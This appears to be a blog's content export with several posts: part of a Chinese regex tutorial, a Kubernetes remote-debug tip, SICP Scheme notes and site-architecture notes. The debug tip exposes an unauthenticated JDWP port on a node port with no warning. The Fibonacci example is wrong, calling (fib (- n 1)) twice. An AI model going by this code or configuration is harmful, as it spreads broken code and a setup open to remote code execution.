<li>(?(group)yes|no) 如果堆栈上存在以名为 group 的捕获内容的话，继续匹配 yes 部分的表达式，否则继续匹配 no 部分</li>
<li>(?!) 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</li>
</ul>
<p>如果你不是一个程序员（或者你自称程序员但是不知道堆栈是什么东西），你就这样理解上面的三种语法吧：第一个就是在黑板上写一个 “group”，第二个就是从黑板上擦掉一个 “group”，第三个就是看黑板上写的还有没有 “group”，如果有就继续匹配 yes 部分，否则就匹配 no 部分。 我们需要做的是每碰到了左括号，就在压入一个 “Open”, 每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空－－如果不为空那就证明左括号比右括号多，那匹配就应该失败。正则表达式引擎会进行回溯 (放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配。</p>
<pre><code>&lt;                         #最外层的左括号
    [^&lt;&gt;]*                #最外层的左括号后面的不是括号的内容
    (
        (
            (?&#39;Open&#39;&lt;)    #碰到了左括号，在黑板上写一个&quot;Open&quot;
            [^&lt;&gt;]*       #匹配左括号后面的不是括号的内容
        )+
        (
            (?&#39;-Open&#39;&gt;)   #碰到了右括号，擦掉一个&quot;Open&quot;
            [^&lt;&gt;]*        #匹配右括号后面不是括号的内容
        )+
    )*
    (?(Open)(?!))         #在遇到最外层的右括号前面，判断黑板上还有没有没擦掉的&quot;Open&quot;；如果还有，则匹配失败

&gt;                         #最外层的右括号
</code></pre>
<p>平衡组的一个最常见的应用就是匹配 HTML, 下面这个例子可以匹配嵌套的 &lt; div&gt; 标签：</p>
<pre><code>&lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?&#39;Open&#39;&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?&#39;-Open&#39;&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;.
</code></pre>
<h2 id="还有些什么东西没提到"><a href="#还有些什么东西没提到" class="headerlink" title="还有些什么东西没提到"></a>还有些什么东西没提到</h2><p>上边已经描述了构造正则表达式的大量元素，但是还有很多没有提到的东西。下面是一些未提到的元素的列表，包含语法和简单的说明。你可以在网上找到更详细的参考资料来学习它们 -- 当你需要用到它们的时候。如果你安装了 MSDN Library, 你也可以在里面找到. net 下正则表达式详细的文档。 这里的介绍很简略，如果你需要更详细的信息，而又没有在电脑上安装 MSDN Library, 可以查看<a class="link"   href="http://msdn.microsoft.com/zh-cn/library/az24scfc.aspx" >关于正则表达式语言元素的 MSDN 在线文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。 表 7. 尚未详细讨论的语法</p>
<p>代码 &#x2F; 语法</p>
<p>说明</p>
<p>\a</p>
<p>报警字符 (打印它的效果是电脑嘀一声)</p>
<p>\b</p>
<p>通常是单词分界位置，但如果在字符类里使用代表退格</p>
<p>\t</p>
<p>制表符，Tab</p>
<p>\r</p>
<p>回车</p>
<p>\v</p>
<p>竖向制表符</p>
<p>\f</p>
<p>换页符</p>
<p>\n</p>
<p>换行符</p>
<p>\e</p>
<p>Escape</p>
<p>\0nn</p>
<p>ASCII 代码中八进制代码为 nn 的字符</p>
<p>\xnn</p>
<p>ASCII 代码中十六进制代码为 nn 的字符</p>
<p>\unnnn</p>
<p>Unicode 代码中十六进制代码为 nnnn 的字符</p>
<p>\cN</p>
<p>ASCII 控制字符。比如 \ cC 代表 Ctrl+C</p>
<p>\A</p>
<p>字符串开头 (类似 ^，但不受处理多行选项的影响)</p>
<p>\Z</p>
<p>字符串结尾或行尾 (不受处理多行选项的影响)</p>
<p>\z</p>
<p>字符串结尾 (类似 $，但不受处理多行选项的影响)</p>
<p>\G</p>
<p>当前搜索的开头</p>
<p>\p{name}</p>
<p>Unicode 中命名为 name 的字符类，例如 \ p{IsGreek}</p>
<p>(?&gt;exp)</p>
<p>贪婪子表达式</p>
<p>(?-exp)</p>
<p>平衡组</p>
<p>(?im-nsx:exp)</p>
<p>在子表达式 exp 中改变处理选项</p>
<p>(?im-nsx)</p>
<p>为表达式后面的部分改变处理选项</p>
<p>(?(exp)yes</p>
<p>no) | 把 exp 当作零宽正向先行断言，如果在这个位置能匹配，使用 yes 作为此组的表达式；否则使用 no</p>
<p>(?(exp)yes)</p>
<p>同上，只是使用空表达式作为 no</p>
<p>(?(name)yes</p>
<p>no) | 如果命名为 name 的组捕获到了内容，使用 yes 作为表达式；否则使用 no</p>
<p>(?(name)yes)</p>
<p>同上，只是使用空表达式作为 no</p>
<h2 id="联系作者"><a href="#联系作者" class="headerlink" title="联系作者"></a>联系作者</h2><p>好吧, 我承认, 我骗了你, 读到这里你肯定花了不止 30 分钟. 相信我, 这是我的错, 而不是因为你太笨. 我之所以说 “30 分钟”, 是为了让你有信心, 有耐心继续下去. 既然你看到了这里, 那证明我的阴谋成功了. 被忽悠的感觉很爽吧？ 网上的资源及本文参考文献</p>
<ul>
<li><a class="link"   href="http://msdn.microsoft.com/library/chs/default.asp?url=/library/CHS/jscript7/html/jsreconintroductiontoregularexpressions.asp" >微软的正则表达式教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://msdn2.microsoft.com/zh-cn/library/system.text.regularexpressions.regex.aspx" >System.Text.RegularExpressions.Regex 类 (MSDN)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://www.regular-expressions.info/" >专业的正则表达式教学网站 (英文)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://weblogs.asp.net/whaggard/archive/2005/02/20/377025.aspx" >关于. Net 下的平衡组的详细讨论（英文）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="http://www.oreilly.com/catalog/regex2/" >Mastering Regular Expressions (Second Edition)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="更新纪录"><a href="#更新纪录" class="headerlink" title="更新纪录"></a>更新纪录</h2><ol>
<li>2006-3-27 第一版</li>
<li>2006-10-12 第二版<ul>
<li>修正了几个细节上的错误和不准确的地方</li>
<li>增加了对处理中文时的一些说明</li>
<li>更改了几个术语的翻译（采用了 MSDN 的翻译方式）</li>
<li>增加了平衡组的介绍</li>
<li>放弃了对 The Regulator 的介绍，改用 Regex Tester</li>
</ul>
</li>
<li>2007-3-12 V2.1<ul>
<li>修正了几个小的错误</li>
<li>增加了对处理选项 (RegexOptions) 的介绍</li>
</ul>
</li>
<li>2007-5-28 V2.2<ul>
<li>重新组织了对零宽断言的介绍</li>
<li>删除了几个不太合适的示例，添加了几个实用的示例</li>
<li>其它一些微小的更改</li>
</ul>
</li>
<li>2007-8-3 V2.21<ul>
<li>修改了几处文字错误</li>
<li>修改 &#x2F; 添加了对 $,\b 的精确说明</li>
<li>承认了作者是个骗子</li>
<li>给 RegexTester 添加了 Singleline 选项的相关功能</li>
</ul>
</li>
<li>2008-4-13 v2.3<ul>
<li>调整了部分章节的次序</li>
<li>修改了页面布局，删除了专门的参考节</li>
<li>针对读者的反馈，调整了部分内容</li>
</ul>
</li>
<li>2009-4-11 v2.31<ul>
<li>修改了几处文字错误</li>
<li>添加了一些注释说明</li>
<li>调整了一些措词</li>
</ul>
</li>
<li>2011-8-17 v2.32<ul>
<li>更改了工具介绍，换用自行开发的正则表达式测试器</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>match</tag>
        <tag>regex</tag>
        <tag>test</tag>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Remote debug on K8s</title>
    <url>/2020/06/06/remote-debug-on-rancher/</url>
    <content><![CDATA[<h3 id="Basic-Setting"><a href="#Basic-Setting" class="headerlink" title="Basic Setting"></a>Basic Setting</h3><ol>
<li><p>Append <code> -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005</code> to your <code>JAVA_TOOL_OPTIONS</code> enviroment variables.</p>
</li>
<li><p>Set your contaier mapping policy as node port and mapping your container port 5005 to any host port.</p>
</li>
<li><p>redeploy your app workload.</p>
</li>
<li><p>new idea remote run config and change the port as the above host port.</p>
</li>
</ol>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>K8s</tag>
      </tags>
  </entry>
  <entry>
    <title>SICP lec1a: # Lisp overview</title>
    <url>/2017/12/03/sicp/</url>
    <content><![CDATA[<p>origin link <a class="link"   href="https://www.bilibili.com/video/av8515129/index_2.html#page=1" >sicp 1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="Black-box-module"><a href="#Black-box-module" class="headerlink" title="Black box(module)"></a>Black box(module)</h1><hr>
<p><code>(* x (+ a b))</code> First scene: Every parentheses is a container called black box, we can take a and b as to varible, like number, electric signal, whatever, we add them, then mul or expand them x times.</p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>primitive elements <code>+ : operator</code> <code>17.4 : number</code> means of combination <code>(+ 3 17.4 5)</code> means of abstration It’s a tree, but we write it as a plain text formation.</p>
<h3 id="define"><a href="#define" class="headerlink" title="define"></a>define</h3><h4 id="varible"><a href="#varible" class="headerlink" title="varible:"></a>varible:</h4><pre><code>(define a (* 5 5))
// the above a will be like 5 * 5(expression could be varible)
</code></pre>
<h4 id="function"><a href="#function" class="headerlink" title="function:"></a>function:</h4><pre><code>(define (square x) (* x x))
(square (square (square 5)))
</code></pre>
<p>sweet:</p>
<pre><code>(define square
        (lambda (x) (* x x))
)
</code></pre>
<p>this seems like every define is a process.</p>
<h4 id="condition"><a href="#condition" class="headerlink" title="condition:"></a>condition:</h4><pre><code>(if (&lt; x 100) (display &quot;lower than 100&quot;))
</code></pre>
<h3 id="Recursive-defination-Heron-square-root"><a href="#Recursive-defination-Heron-square-root" class="headerlink" title="Recursive defination (Heron square root)"></a>Recursive defination (Heron square root)</h3><p>Hreon : get the square root of x</p>
<blockquote>
<ol>
<li><p>make a guess</p>
</li>
<li><p>improve guess by get the average of guess and x&#x2F;guess</p>
</li>
<li><p>good-enough? done : improve guess</p>
</li>
</ol>
</blockquote>
<p>tips: good-enough? how close between x&#x2F;guess (&lt; abs (- (square guess) x) .001)</p>
<hr>
<p>Analyze as a tree: (root 2) (try 1 2) (try (improve 1 2) 2) (try 1.5 2)</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20171203152024769?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="recursive"
                ></p>
<h3 id="Important-note"><a href="#Important-note" class="headerlink" title="Important note:"></a>Important note:</h3><pre><code>(define a (* 5 5))
(define (d) (* 5 5))
</code></pre>
<p>output:</p>
<pre><code>a -&gt; 25
d -&gt; d procedure
(d) -&gt; 25
(a) -&gt; error
</code></pre>
<h1 id="Computing-process"><a href="#Computing-process" class="headerlink" title="Computing process"></a>Computing process</h1><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20171203221226654?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="心智"
                ></p>
<h3 id="kinds-of-expressions"><a href="#kinds-of-expressions" class="headerlink" title="kinds of expressions"></a>kinds of expressions</h3><p>number symbols</p>
<hr>
<p>lambda definations conditionals</p>
<hr>
<p>combinations</p>
<hr>
<h3 id="condition-1"><a href="#condition-1" class="headerlink" title="condition"></a>condition</h3><p>if (define (+ x u) (if (&#x3D; x 0) y (+ (-1 x) (1 y)) ) )</p>
<h3 id="Fibonacci"><a href="#Fibonacci" class="headerlink" title="Fibonacci"></a>Fibonacci</h3><pre><code>(define (fib n)
    (if (&lt; n 2)
        n
        (+  (fib (- n 1))
            (fib (- n 1))
        )
    )
)
</code></pre>
<hr>
<p>tips: 1+ function means add args 1 and return</p>
<hr>
<h3 id="Hanoi-Tower"><a href="#Hanoi-Tower" class="headerlink" title="Hanoi Tower"></a>Hanoi Tower</h3><pre><code>(define (dohanoi n to from using)
  (if (&gt; n 0)
      (begin
        (dohanoi (- n 1) using from to)
        (display &quot;move &quot;)
        (display from)
        (display &quot; --&gt; &quot;)
        (display to)
        (newline)
        (dohanoi (- n 1) to using from)
        #t)
      #f))

(define (hanoi n)
    (dohanoi n 3 1 2))
</code></pre>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>black box</tag>
        <tag>lisp</tag>
        <tag>module</tag>
        <tag>scheme</tag>
        <tag>sicp</tag>
      </tags>
  </entry>
  <entry>
    <title>Site Architecture</title>
    <url>/2020/07/18/site-architechture/</url>
    <content><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="The-whole-process-of-evolution"><a href="#The-whole-process-of-evolution" class="headerlink" title="The whole process of evolution"></a>The whole process of evolution</h3><h4 id="The-initial-tiny-site"><a href="#The-initial-tiny-site" class="headerlink" title="The initial tiny site"></a>The initial tiny site</h4><ol>
<li><p>Application server needs much stronger CPU to control the complex business.</p>
</li>
<li><p>Database server need much faster disk and larger memory to get disk retrieval &amp; data cache faster</p>
</li>
<li><p>So as file server need the disk.</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/1adf.png"
                      class="" title="1adf"
                >

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Note: There are 80% business on the 20% data</span><br><span class="line"></span><br><span class="line">example: U may only Baidu the several front pages  </span><br></pre></td></tr></table></figure></div>

<h4 id="The-site-is-growing"><a href="#The-site-is-growing" class="headerlink" title="The site is growing"></a>The site is growing</h4><ol>
<li><p>Read and write database will be separated exactly.</p>
</li>
<li><p>CDN &amp; Reverse Proxy</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/3cdn&reverse.png"
                      class="" title="3cdn&amp;reverse"
                >

<p>Both CDN and Reverse Proxy use the cache model.<br>But the CDN decided u access the web on the close net provider while the Reverse Proxy on the center.</p>
<ol start="3">
<li>distributed file and database.</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/file&database.png"
                      class="" title="distributed"
                >

<ol start="4">
<li>With the task get much complex, the demand ability of data check getting higher, so you need to take some advice like <code>NoSQL</code> or <code>Nondatabase query technology</code> like a search engine.</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/nosql.png"
                      class="" title="nosql"
                >

<ol start="5">
<li><p>Business split</p>
</li>
<li><p>distributed service</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/final.png"
                      class="" title="final"
                >

<h4 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h4><ol>
<li><p>We are growing, not rebuild or create.</p>
</li>
<li><p>The real power is the business development</p>
</li>
</ol>
<p>Business make technology, career makes a man.</p>
<h4 id="Misunderstand-area"><a href="#Misunderstand-area" class="headerlink" title="Misunderstand area"></a>Misunderstand area</h4><ol>
<li><p>Blind pursue large site solutions.</p>
</li>
<li><p>For technology to technology.(but for business)</p>
</li>
<li><p>Technology not the real point sometimes(12306)</p>
</li>
</ol>
<h3 id="Architecture-Pattern"><a href="#Architecture-Pattern" class="headerlink" title="Architecture Pattern"></a>Architecture Pattern</h3><h4 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h4><ol>
<li><p>stratification(horizontal): application, service, data.</p>
<ul>
<li><p>advantage: keep the interface, everyone justifies their own works.</p>
</li>
<li><p>disadvantage: the interface and splice layer border need be careful.</p>
</li>
</ul>
</li>
<li><p>segmentation(vertical): divide the function and business </p>
</li>
<li><p>distributed: both front points to this aim</p>
</li>
</ol>
<ul>
<li><p>distributed application and business </p>
</li>
<li><p>distributed static sources</p>
</li>
<li><p>distributed data and storage</p>
</li>
<li><p>distributed computing</p>
</li>
</ul>
<ol start="4">
<li>Server clustering</li>
</ol>
<p>Some servers deploy the same application and provide service by loading balance.</p>
<ol start="5">
<li>Cache</li>
</ol>
<ul>
<li><p>CDN</p>
</li>
<li><p>Reverse Proxy</p>
</li>
<li><p>Local cache</p>
</li>
<li><p>distributed cache</p>
</li>
<li><p>precondition </p>
<ul>
<li><p>the cache only be short-term effective</p>
</li>
<li><p>the data which caused by hot point without balance should be put in the cache</p>
</li>
</ul>
</li>
</ul>
<ol start="6">
<li>Asynchronous</li>
</ol>
<ul>
<li><p>improve system </p>
</li>
<li><p>improve web site responsive speed</p>
</li>
<li><p>avoid distributed access peak</p>
</li>
</ul>
<ol start="7">
<li>Redundance</li>
</ol>
<ul>
<li><p>cold backup</p>
</li>
<li><p>hot backup</p>
</li>
</ul>
<ol start="8">
<li>Automatic</li>
</ol>
<ul>
<li><p>code manager</p>
</li>
<li><p>test </p>
</li>
<li><p>security</p>
</li>
<li><p>deploy</p>
</li>
<li><p>monitor</p>
</li>
<li><p>alert</p>
</li>
<li><p>lose effect move</p>
</li>
<li><p>lose effect recover</p>
</li>
<li><p>level down</p>
</li>
<li><p>allocate resources</p>
</li>
</ul>
<h4 id="Sina-apply-example"><a href="#Sina-apply-example" class="headerlink" title="Sina apply example"></a>Sina apply example</h4><ol>
<li><p>initial: lamp</p>
</li>
<li></li>
</ol>
<ul>
<li><p>base server layer: support database, storage, cache, search and other technology.</p>
</li>
<li><p>the middle layer is platform service and application service.</p>
</li>
<li><p>the upon layer is API, the third party service and sina business layer.</p>
</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/sina.png"
                      class="" title="sina"
                >

<ol start="3">
<li><p>MPSS: Now the solutions shows like virtual the physical machine. As this way, they even can use the same port while the MPSS can not.</p>
</li>
<li><p>Multi-Level Cache</p>
</li>
</ol>
<h3 id="Architecture-kernel-point"><a href="#Architecture-kernel-point" class="headerlink" title="Architecture kernel point"></a>Architecture kernel point</h3><blockquote>
<p>What is architecture?</p>
</blockquote>
<p><strong>The highest level of planning, difficult decisions to change</strong></p>
<blockquote>
<p>Keep their balance</p>
</blockquote>
<ul>
<li><p>Performance</p>
<p>Browser: cache, compress the page, decrease the transfer cookie, layer regularly.</p>
<p>Server: CDN, local and distributed cache, asynchronous message queue</p>
<p>Code: multi threads, manage the memory</p>
<p>Databae: index, cache, sql optimise, NoSQL</p>
</li>
<li><p>Serviceability</p>
<p>For application server, it can not storage session info.</p>
<p>For storage server, it should be real-time backup</p>
<blockquote>
<p>Function: Check whether the whole can work when some servers died.</p>
</blockquote>
</li>
<li><p>Flexibility</p>
<p>Application Cluster: Add new blood by using loading balance machine.</p>
<p>Cache Cluster: Cache router algorithm</p>
<p>Database Cluster Way: Routing partition   </p>
</li>
<li><p>Augment ability</p>
<p> Event-driven Architecture: Message queue</p>
<p> Distributed Service: Divide the business and reuse service and call by distributed service framework</p>
</li>
<li><p>Safety</p>
</li>
</ul>
<h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><h3 id="Instant-response"><a href="#Instant-response" class="headerlink" title="Instant response"></a>Instant response</h3><h4 id="Web-Site-Performance-Test"><a href="#Web-Site-Performance-Test" class="headerlink" title="Web Site Performance Test"></a>Web Site Performance Test</h4><ol>
<li>Different view of the sites’ performance</li>
</ol>
<ul>
<li><p>User view: the speed</p>
<ul>
<li>Most about front end, optimise html css, cdn, reverse proxy, cache strategy</li>
</ul>
</li>
<li><p>Developer view:</p>
<ul>
<li><p>Cache speed up data, distributed handle</p>
</li>
<li><p>Improve the read and write ability by using cluster</p>
</li>
<li><p>Asynchronous message speed up the response.</p>
</li>
</ul>
</li>
<li><p>Operations view:</p>
<ul>
<li><p>MNO bandwidth</p>
</li>
<li><p>Server hardware configuration</p>
</li>
<li><p>Data center network architecture</p>
</li>
</ul>
</li>
</ul>
<ol start="2">
<li>Performance test index</li>
</ol>
<ul>
<li><p>Time: test to calculate the time segment</p>
</li>
<li><p>Distribution counts: test by using multi threads</p>
</li>
<li><p>Throughput capacity: TPS, QPS, HPS</p>
</li>
<li><p>Performance counter: System load(top command)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">top - 18:38:43 up 5 days,  8:33,  1 user,  load average: 0.00, 0.01, 0.05</span><br><span class="line">Tasks:  74 total,   1 running,  73 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 <span class="built_in">id</span>,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1883860 total,   106724 free,   456832 used,  1320304 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.  1115392 avail Mem </span><br><span class="line"></span><br><span class="line">PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                                    </span><br><span class="line">  1 root      20   0   43076   3528   2408 S  0.0  0.2   0:06.31 systemd    </span><br></pre></td></tr></table></figure></div></li>
</ul>
<ol start="3">
<li>Performance test function</li>
</ol>
<ul>
<li><p>Performance test</p>
</li>
<li><p>Loading test</p>
</li>
<li><p>Pressure test</p>
</li>
<li><p>Stability test</p>
</li>
</ul>
  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/test.png"
                      class="" title="test"
                >
  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/test2.png"
                      class="" title="test2"
                >

<ul>
<li>Performance test report example</li>
</ul>
  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/example.png"
                      class="" title="example"
                > 

<h4 id="Front-end-optimise"><a href="#Front-end-optimise" class="headerlink" title="Front end optimise"></a>Front end optimise</h4><ol>
<li>Browser</li>
</ol>
<ul>
<li><p>reduce the http request(merge the img, css and js)</p>
</li>
<li><p>Use the browser cache(header: Cache-control, expire; one by one update the icon; update the call name instead of the file(html call, js file))</p>
</li>
<li><p>turn on the gzip</p>
</li>
<li><p>CSS on the header, js on the body tail.</p>
</li>
<li><p>Reduce the cookie transfer(While static resources)</p>
</li>
</ul>
<ol start="2">
<li>CDN &amp; Reverse Proxy</li>
</ol>
<ul>
<li>loading speed, reduce request, security; loading balance, cache</li>
</ul>
<h4 id="Application-server-optimise"><a href="#Application-server-optimise" class="headerlink" title="Application server optimise"></a>Application server optimise</h4><ol>
<li>Distributed cache</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/Bcache.png"
                      class="" title="Bcache"
                >

<ol start="2">
<li>Rational use cache</li>
</ol>
<ul>
<li><p>update the data usually</p>
</li>
<li><p>No access point</p>
</li>
<li><p>Not the same data &amp; read wrong info</p>
</li>
<li><p>Cache use ability</p>
</li>
<li><p>Cache warming(metadata)</p>
</li>
<li><p>The cache to penetrate(not exist also need be saved as null value)</p>
</li>
</ul>
<ol start="3">
<li>Distributed cache architecture</li>
</ol>
<ul>
<li><p>JBoss cache and <strong>Memcached</strong></p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/memcached.png"
                      class="" title="memcached"
                >
<ul>
<li><p>Libevent</p>
</li>
<li><p>Memory manage: slab, chunk, LRU,</p>
</li>
</ul>
</li>
</ul>
<ol start="4">
<li>Code optimise</li>
</ol>
<ul>
<li><p>Multi threads code</p>
<ul>
<li><p>Start threads &#x3D; [Task execute time&#x2F;(Task execute time - IO wait time)] * CPU kernel counts</p>
</li>
<li><p>Stateless object</p>
</li>
<li><p>Local object </p>
</li>
<li><p>distributed access with lock</p>
</li>
</ul>
</li>
</ul>
<ol start="5">
<li><p>Resources reuse</p>
<ul>
<li><p>Singleton</p>
</li>
<li><p>Object pool</p>
</li>
</ul>
</li>
<li><p>Data Structure &amp; Algorithm</p>
</li>
</ol>
<ul>
<li><p>Hash time33</p>
</li>
<li><p>Garbage collection</p>
<ul>
<li><p>Stack: function args, local variables</p>
</li>
<li><p>Heap: create &amp; delete object &amp; garbage collection</p>
</li>
</ul>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/jvmgarbage.png"
                      class="" title="jvmgarbage"
                ></li>
</ul>
<h4 id="Storage-performance-optimise"><a href="#Storage-performance-optimise" class="headerlink" title="Storage performance optimise"></a>Storage performance optimise</h4><ul>
<li><p>SSD (B+ potential)</p>
</li>
<li><p>B+ tree VS LSM tree</p>
</li>
<li><p>RAID VS HDFS</p>
<ul>
<li>RAID</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/raid.png"
                      class="" title="RAID"
                >

<ul>
<li>HDFS: name node &amp; data node(Map reduce)</li>
</ul>
</li>
</ul>
<h3 id="No-danger-of-anything-going-wrong"><a href="#No-danger-of-anything-going-wrong" class="headerlink" title="No danger of anything going wrong"></a>No danger of anything going wrong</h3><h4 id="Measurement-and-assessment"><a href="#Measurement-and-assessment" class="headerlink" title="Measurement and assessment"></a>Measurement and assessment</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/fault.png"
                      class="" title="fault level"
                >

<h4 id="Cluster-session"><a href="#Cluster-session" class="headerlink" title="Cluster session"></a>Cluster session</h4><ul>
<li><p>session copy(small cluster)</p>
</li>
<li><p>session binding(…)</p>
</li>
<li><p>note session by cookie</p>
</li>
<li><p>Session server(The best method)</p>
</li>
</ul>
<h4 id="High-availability-data"><a href="#High-availability-data" class="headerlink" title="High availability data"></a>High availability data</h4><ul>
<li><p>CAP (always use ap without c)</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/cap.png"
                      class="" title="cap"
                >
</li>
<li><p>Backup<br>cold(abandon), hot(Master-Slave)</p>
</li>
<li><p>Fail over </p>
<ul>
<li><p>check: keep-alive, report of access failed</p>
</li>
<li><p>move: route computing find true server</p>
</li>
<li><p>data recover: recover the backup count again</p>
</li>
</ul>
</li>
</ul>
<h4 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h4><ol>
<li>Data collection</li>
</ol>
<ul>
<li><p>User behaviors collection</p>
<ul>
<li><p>Server logs collection</p>
</li>
<li><p>Client Browser logs collection by js(Tool: storm log analyze)</p>
</li>
</ul>
</li>
<li><p>Server Performance Monitor</p>
<ul>
<li>Load, memory, disk IO, NetWork IO(Tool: Ganglia)</li>
</ul>
</li>
<li><p>Data report</p>
</li>
</ul>
<ol start="2">
<li>Monitor manage</li>
</ol>
<ul>
<li><p>System alert </p>
</li>
<li><p>Fail over</p>
</li>
<li><p>Automatic degrade</p>
</li>
</ul>
<h3 id="Telescopic-architecture"><a href="#Telescopic-architecture" class="headerlink" title="Telescopic architecture"></a>Telescopic architecture</h3><h4 id="Architecture-edesign"><a href="#Architecture-edesign" class="headerlink" title="Architecture edesign"></a>Architecture edesign</h4><ol>
<li><p>Different function divided by physical </p>
</li>
<li><p>Single function divided by cluster</p>
</li>
</ol>
<h4 id="Application-server-cluster-design-Loading-balance"><a href="#Application-server-cluster-design-Loading-balance" class="headerlink" title="Application server cluster design (Loading balance)"></a>Application server cluster design (Loading balance)</h4><ol>
<li>Http(302 but for SEO works not well)</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/HTTPbal.png"
                      class="" title="httpbal"
                >

<ol start="2">
<li>DNS</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/dns.png"
                      class="" title="dns"
                >

<ol start="3">
<li>Reverse Proxy</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/reversep.png"
                      class="" title="reverseProxy"
                >

<ol start="4">
<li>IP</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/p.png"
                      class="" title="ip"
                >

<ol start="5">
<li>Data Link(Direct route)   <strong>[linux tool: LVS]</strong></li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/datalink.png"
                      class="" title="datalink"
                >

<ol start="6">
<li>Algorithm</li>
</ol>
<ul>
<li><p>Round robin</p>
</li>
<li><p>Weighted round robin</p>
</li>
<li><p>Random</p>
</li>
<li><p>Least Connections</p>
</li>
<li><p>Sources Hashing</p>
</li>
</ul>
<h4 id="Distributed-Cache-Cluster-Design"><a href="#Distributed-Cache-Cluster-Design" class="headerlink" title="Distributed Cache Cluster  Design"></a>Distributed Cache Cluster  Design</h4><ol>
<li>Memcached model</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/memcachedmodel.png"
                      class="" title="memmodel"
                >

<ol start="2">
<li>Memcached challenge</li>
